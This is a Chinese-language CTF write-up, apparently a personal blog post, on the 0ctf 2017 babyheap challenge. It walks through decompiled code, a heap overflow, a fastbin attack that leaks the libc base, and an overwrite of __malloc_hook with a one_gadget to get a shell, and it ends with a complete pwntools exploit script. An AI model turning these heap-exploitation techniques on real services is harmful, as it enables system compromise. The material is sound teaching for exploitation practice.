<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>FastBinAttack实战 - babyheap_0ctf_2017 | TokameinE - 雨声淅淅沥沥，犬吠永不止息</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light')
 document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark')
 document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: Bender;
 src: local('Bender'), url("/font/Bender.ttf"), url("/font/Bender.otf");
}
@font-face {
 font-family: BenderLight;
 src: local('BenderLight'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('/img/bg.jpg');
  --light-background: url('/img/91110244_p0.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li><li class="navItem"><a class="navBlock" href="/links/"><span class="navItemTitle">Links</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>FastBinAttack实战 - babyheap_0ctf_2017</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2021-08-09T06:35:48.000Z" id="date"> 2021-08-09</time></div></span><br><span>Last Update: <div class="control"><time datetime="2024-12-29T04:50:34.986Z" id="updated"> 2024-12-29</time></div></span></div></div><hr><div id="post-content"><p>​</p>
<h3 id="分析利用："><a href="#分析利用：" class="headerlink" title="分析利用："></a>分析利用：</h3><p>        无壳，IDA打开后可以看出题目是基本的增删与展示（函数名为方便阅读而修改）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">__int64 __fastcall main(__int64 a1, char **a2, char **a3)<br>&#123;<br>  char *v4; // [rsp+8h] [rbp-8h]<br><br>  v4 = initMmapList();<br>  while ( 1 )<br>  &#123;<br>    Menu();<br>    switch ( getInput() )<br>    &#123;<br>      case 1LL:<br>        Allocate(v4);<br>        break;<br>      case 2LL:<br>        Fill(v4);<br>        break;<br>      case 3LL:<br>        Free(v4);<br>        break;<br>      case 4LL:<br>        Dump((__int64)v4);<br>        break;<br>      case 5LL:<br>        return 0LL;<br>      default:<br>        continue;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/f974ce18-ced4-41a5-81d2-6a28257bbba3'><img src="blob:https://tokameine.top/f974ce18-ced4-41a5-81d2-6a28257bbba3"></p>
<p>        v4通过mmap分配了“一条链表”，但通过Allocate函数可以知道，实际的储存结构是类似chunk似的结构体：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">00000000    size_t InUse<br>00000008    size_t Size<br>00000010    size_t content<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/18d07071-8859-408b-87e4-74537218bb17'><img src="blob:https://tokameine.top/18d07071-8859-408b-87e4-74537218bb17"></p>
<p>         每次Allocate都会遍历v4链表的每个InUse位，如果该位置0，就表示这个索引没有被使用，就会将该位置1，然后根据Size调用calloc，将返回值赋给content</p>
<p>        然后可以看看Free函数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">__int64 __fastcall Free(__int64 a1)<br>&#123;<br>  __int64 result; // rax<br>  int v2; // [rsp+1Ch] [rbp-4h]<br><br>  printf(&quot;Index: &quot;);<br>  result = getInput();<br>  v2 = result;<br>  if ( (int)result &gt;= 0 &amp;&amp; (int)result &lt;= 15 )<br>  &#123;<br>    result = *(unsigned int *)(24LL * (int)result + a1);<br>    if ( (_DWORD)result == 1 )<br>    &#123;<br>      *(_DWORD *)(24LL * v2 + a1) = 0;<br>      *(_QWORD *)(24LL * v2 + a1 + 8) = 0LL;<br>      free(*(void **)(24LL * v2 + a1 + 16));<br>      result = 24LL * v2 + a1;<br>      *(_QWORD *)(result + 16) = 0LL;<br>    &#125;<br>  &#125;<br>  return result;<br>&#125;<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/58767a1b-ff80-4f00-b5a6-f856aa90e27a'><img src="blob:https://tokameine.top/58767a1b-ff80-4f00-b5a6-f856aa90e27a"></p>
<p>        由于free之后将指针全都清零了，所以指针复用在这里不太行</p>
<p>        然后是Fill函数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">__int64 __fastcall Fill(__int64 a1)<br>&#123;<br>  __int64 result; // rax<br>  int v2; // [rsp+18h] [rbp-8h]<br>  int v3; // [rsp+1Ch] [rbp-4h]<br><br>  printf(&quot;Index: &quot;);<br>  result = getInput();<br>  v2 = result;<br>  if ( (int)result &gt;= 0 &amp;&amp; (int)result &lt;= 15 )<br>  &#123;<br>    result = *(unsigned int *)(24LL * (int)result + a1);<br>    if ( (_DWORD)result == 1 )<br>    &#123;<br>      printf(&quot;Size: &quot;);<br>      result = getInput();<br>      v3 = result;<br>      if ( (int)result &gt; 0 )<br>      &#123;<br>        printf(&quot;Content: &quot;);<br>        result = sub_11B2(*(_QWORD *)(24LL * v2 + a1 + 16), v3);<br>      &#125;<br>    &#125;<br>  &#125;<br>  return result;<br>&#125;<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/6184367c-cf59-4837-ad9f-84b8deb37e7b'><img src="blob:https://tokameine.top/6184367c-cf59-4837-ad9f-84b8deb37e7b"></p>
<p>         可以看到，该函数没有限制我们的输入，因此我们可以让content开辟过大的chunk来达成堆溢出</p>
<p>        最后是Dump：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">int __fastcall Dump(__int64 a1)<br>&#123;<br>  int result; // eax<br>  int v2; // [rsp+1Ch] [rbp-4h]<br><br>  printf(&quot;Index: &quot;);<br>  result = getInput();<br>  v2 = result;<br>  if ( result &gt;= 0 &amp;&amp; result &lt;= 15 )<br>  &#123;<br>    result = *(_DWORD *)(24LL * result + a1);<br>    if ( result == 1 )<br>    &#123;<br>      puts(&quot;Content: &quot;);<br>      sub_130F(*(_QWORD *)(24LL * v2 + a1 + 16), *(_QWORD *)(24LL * v2 + a1 + 8));<br>      result = puts(byte_14F1);<br>    &#125;<br>  &#125;<br>  return result;<br>&#125;<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/3fd7b76b-c498-4328-b8b6-1a3ec0c02b05'><img src="blob:https://tokameine.top/3fd7b76b-c498-4328-b8b6-1a3ec0c02b05"></p>
<p>         没有什么可用点，但我们可以用来泄露地址</p>
<p>        我们最终的目的是修改malloc_hook或者free_hook的地址为某个one_gadget</p>
<p>        为此我们需要泄露libc基址、通过伪造fake_chunk来向hook附近通过Fill函数填充溢出覆盖</p>
<p>        Unsorted Bin双向链表能够将表头放入fd指针，通过Dump就能够泄露出库函数地址</p>
<p><strong>如下过程参考CTF-WIKI：</strong></p>
<p>        首先需要泄露libc基址，为此我们需要通过Unsorted Bin获取fd指针，因此需要构造指针复用的情况，将两个索引的content指针指向同一个chunk</p>
<p>        适当开辟几个符合Fast Bin的chunk（不一定要像笔者这样，指需理解思路即可），idx4作为泄露基地址的chunk，idx 0用于通过堆溢出来复写idx 1，idx 3来复写 idx4</p>
<p>        然后用Free函数构成Fast Bin链表 idx1—&gt;idx2</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">allocate(0x10) #idx 0<br>allocate(0x10) #idx 1<br>allocate(0x10) #idx 2<br>allocate(0x10) #idx 3<br>allocate(0x80) #idx 4<br>free(2)<br>free(1)<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/ddc57d52-4892-412e-ae55-deb61ed1a604'><img src="blob:https://tokameine.top/ddc57d52-4892-412e-ae55-deb61ed1a604"></p>
<p>        因为每个堆都是按页对齐的，所以如果将idx 1的fd指针的最后一个字节指向0x80就会指向idx 4，由此构造出Fast Bin链 idx1—&gt;idx 4</p>
<p>        由于Fast Bin有chunk块大小检查，所以将idx 4的size复写为与idx 1相同来绕过检查</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">payload=&#x27;a&#x27;*0x10+p64(0)+p64(0x21)+p8(0x80)<br>fill(0,payload)<br>payload=&#x27;a&#x27;*0x10+p64(0)+p64(0x21)<br>fill(3,payload)<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/ff32163e-fa2a-4638-a884-898d09a82c4c'><img src="blob:https://tokameine.top/ff32163e-fa2a-4638-a884-898d09a82c4c"></p>
<p>        Fast Bin为LIFO，接下来再重新开辟会idx 1和idx 2，然后再将idx 4的size修改回去</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">allocate(0x10) #idx 1<br>allocate(0x10) #idx 2<br>payload=&#x27;a&#x27;*0x10+p64(0)+p64(0x91)<br>fill(3,payload)<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/9c3cafd4-c62a-4a3a-9ef1-49ed00eae365'><img src="blob:https://tokameine.top/9c3cafd4-c62a-4a3a-9ef1-49ed00eae365"></p>
<p>        此时，idx 2和idx 4的content指向了同一个地址，只要我们将idx 4释放掉，该chunk就会被放入Unsorted Bin，并增加fd指针，然后再Dump出idx 2即可泄露libc基址（不过需要先开辟idx 5以放置idx 4和Top chunk合并）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">allocate(0x100) #idx 5<br>free(4)<br>dump(2)<br>p.recvuntil(&#x27;Content: \n&#x27;)<br><br>unsortedbin_addr=u64(p.recv(8))<br>print hex(unsortedbin_addr)<br><br>main_arena_offset=0x3c4b20<br><br>def offset_bin_main_arena(idx):<br>word_bytes = context.word_size / 8<br>offset = 4  # lock<br>offset += 4  # flags<br>offset += word_bytes * 10  # offset fastbin<br>offset += word_bytes * 2  # top,last_remainder<br>offset += idx * 2 * word_bytes  # idx<br>offset -= word_bytes * 2  # <br>return offset<br><br>unsortedbin_offset_main_arena = offset_bin_main_arena(0)<br>main_arena_addr = unsortedbin_addr - unsortedbin_offset_main_arena<br>libc_base = main_arena_addr - main_arena_offset<br>print hex(libc_base)<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/68b59774-72ee-44e1-b222-e484a6ff3d9f'><img src="blob:https://tokameine.top/68b59774-72ee-44e1-b222-e484a6ff3d9f"></p>
<p>        main_arena_offset是写在每个libc中的固定值</p>
<p>        有师傅写过获取的脚本项目：<a target="_blank" rel="noopener" href="https://github.com/bash-c/main_arena_offset">https://github.com/bash-c/main_arena_offset</a></p>
<p>        unsortedbin_offset_main_arena这些值也都有固定的计算方式</p>
<p>        因此现在已经泄露出了libc基址</p>
<p>        然后现在将放在Unsorted Bin中的idx 4开辟回来，但我们只开辟0x70的空间，剩下的0x20将被放回Unsorted Bin，而接下来释放idx 4又将其放入Fast Bin</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">allocate(0x60)<br>free(4)<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/49e4ba83-b48f-4455-84da-140d40289822'><img src="blob:https://tokameine.top/49e4ba83-b48f-4455-84da-140d40289822"></p>
<p>        接下来我们使用gdb附加调试来寻找可以伪造fake_chunk的地方：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">gdb-peda$ x /10gx &amp;__malloc_hook-6<br>0x7f03f6128ae0 &lt;_IO_wide_data_0+288&gt;:0x00000000000000000x0000000000000000<br>0x7f03f6128af0 &lt;_IO_wide_data_0+304&gt;:0x00007f03f61272600x0000000000000000<br>0x7f03f6128b00 &lt;__memalign_hook&gt;:0x00007f03f5de9ea00x00007f03f5de9a70<br>0x7f03f6128b10 &lt;__malloc_hook&gt;:0x00000000000000000x0000000000000000<br>0x7f03f6128b20 &lt;main_arena&gt;:0x00000000000000000x0000000000000000<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/00e8191c-9871-498c-8478-7abf343a4b21'><img src="blob:https://tokameine.top/00e8191c-9871-498c-8478-7abf343a4b21"></p>
<p>        （不知道是gdb还是pwndbg的原因，竟然能直接这样查看到地址……）</p>
<p>        我们可以发现0x7f这个数字比较适合被当作fake_chunk的Size ，于是我们将这个这个fake_chunk复写到idx 4的fd指针</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">fake_chunk=main_arena_addr-0x33<br>print hex(fake_chunk)<br>fakechunk=p64(fake_chunk)<br>fill(2,fakechunk)<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/8a0274e8-f66f-4245-a1b5-264be2572ea5'><img src="blob:https://tokameine.top/8a0274e8-f66f-4245-a1b5-264be2572ea5"></p>
<p>        然后用allocate将fake_chunk开辟回来，现在就能通过填充idx 6来溢出到malloc_hook了，然后再调用malloc即可拿到shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">allocate(0x60) #idx 4<br>allocate(0x60) #idx 6<br><br>one_garget=0x4526a+libc_base<br>payload=&#x27;a&#x27;*(0x13)+p64(one_garget)<br>fill(6,payload)<br><br>allocate(0x100)<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/91883d29-b28f-4530-b7ed-ebd648d93450'><img src="blob:https://tokameine.top/91883d29-b28f-4530-b7ed-ebd648d93450"></p>
<p>        但值得注意的是，这道题在于2017年的0ctf上的赛题，在当时使用 libc2.23-0ubuntu11.2版本的共享库，但时至今日，Ubuntu16已经不再使用该版本，而是使用libc2.23-0ubuntu11.3版本共享库，而buu上也使用前者版本</p>
<p>        因此笔者使用libc2.23-0ubuntu11.3中得到的one_gadget虽然在本地拿到了shell，但在远程服务器上却只能通过一些以前的wp来获取当时版本的one_gadget，这里记一下比较常用的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">og1=[0x45216,0x4526a,0xf02a4,0xf1147]    #libc2.23-0ubuntu11.3<br>og2=[0x45226,0x4527a,0xf0364,0xf1207]    #libc2.23-0ubuntu11.2<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/1d4abd32-9839-410e-b224-3c918bc8b2f3'><img src="blob:https://tokameine.top/1d4abd32-9839-410e-b224-3c918bc8b2f3"></p>
<h3 id="完整exp："><a href="#完整exp：" class="headerlink" title="完整exp："></a>完整exp：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">from pwn import *<br>context.log_level=&#x27;debug&#x27;<br>context.os=&#x27;linux&#x27;<br>context.arch=&#x27;amd64&#x27;<br><br>p=process(&#x27;./babyheap_0ctf_2017&#x27;)<br>#p=remote(&quot;node4.buuoj.cn&quot;,27641)<br>elf=ELF(&#x27;./babyheap_0ctf_2017&#x27;)<br>libc=elf.libc<br><br>def cmd(x):<br>p.sendlineafter(&#x27;Command:&#x27;,str(x))<br><br>def allocate(size):<br>cmd(1)<br>p.sendlineafter(&#x27;Size:&#x27;,str(size))<br><br>def fill(index,content):<br>cmd(2)<br>p.sendlineafter(&#x27;Index:&#x27;,str(index))<br>p.sendlineafter(&#x27;Size:&#x27;,str(len(content)))<br>p.sendlineafter(&#x27;Content:&#x27;,content)<br><br>def free(index):<br>cmd(3)<br>p.sendlineafter(&#x27;Index:&#x27;,str(index))<br><br>def dump(index):<br>cmd(4)<br>p.sendlineafter(&quot;Index:&quot;,str(index))<br><br>def offset_bin_main_arena(idx):<br>word_bytes = context.word_size / 8<br>offset = 4  # lock<br>offset += 4  # flags<br>offset += word_bytes * 10  # offset fastbin<br>offset += word_bytes * 2  # top,last_remainder<br>offset += idx * 2 * word_bytes  # idx<br>offset -= word_bytes * 2  # <br>return offset<br><br><br>allocate(0x10)<br>allocate(0x10)<br>allocate(0x10)<br>allocate(0x10)<br>allocate(0x80)<br><br>free(2)<br>free(1)<br><br>payload=&#x27;a&#x27;*0x10+p64(0)+p64(0x21)+p8(0x80)<br>fill(0,payload)<br><br><br><br>payload=&#x27;a&#x27;*0x10+p64(0)+p64(0x21)<br>fill(3,payload)<br>allocate(0x10)<br>allocate(0x10)<br><br>payload=&#x27;a&#x27;*0x10+p64(0)+p64(0x91)<br>fill(3,payload)<br><br>allocate(0x100)<br>free(4)<br>dump(2)<br>p.recvuntil(&#x27;Content: \n&#x27;)<br><br>unsortedbin_addr=u64(p.recv(8))<br>print hex(unsortedbin_addr)<br><br>main_arena_offset=0x3c4b20<br><br>unsortedbin_offset_main_arena = offset_bin_main_arena(0)<br>main_arena_addr = unsortedbin_addr - unsortedbin_offset_main_arena<br>libc_base = main_arena_addr - main_arena_offset<br>print hex(libc_base)<br><br>one_garget=0x4526a+libc_base<br><br><br>allocate(0x60)<br>free(4)<br><br>gdb.attach(p)<br><br>fake_chunk=main_arena_addr-0x33<br>print hex(fake_chunk)<br>fakechunk=p64(fake_chunk)<br>fill(2,fakechunk)<br><br>allocate(0x60)<br>allocate(0x60) #6<br><br>payload=&#x27;a&#x27;*(0x13)+p64(one_garget)<br>fill(6,payload)<br>allocate(0x100)<br><br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/20a4e2ea-10c1-4a06-9f2f-d836b94c65c2'><img src="blob:https://tokameine.top/20a4e2ea-10c1-4a06-9f2f-d836b94c65c2"> ​</p>
<p>插画ID：91746115</p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2021/08/21/seccon-ctf-2016-quals-chat/">← Next SECCON CTF 2016 Quals - Chat 分析与思考</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2021/08/07/glibc-10/">关于如何理解Glibc堆管理器(Ⅹ——完结、补充、注释——Arena、heap_info、malloc_*) Prev →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" href="#toc-div" title="To Catalog">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="/img/faction/6.png" alt="Logo"></a><h1 id="Dr"><a href="TokameinE">TokameinE</a></h1><div id="description"><p></p></div><div id="social-links"><a class="social" target="_blank" rel="noopener" href="https://github.com/ErodedElk"><i class="fab fa-github" alt="GitHub"></i></a><a class="social" target="_blank" rel="noopener" href="https://space.bilibili.com/1782544616"><i class="fa-brands fa-bilibili" alt="BiliBili"></i></a></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E5%88%A9%E7%94%A8%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">分析利用：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4exp%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">完整exp：</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>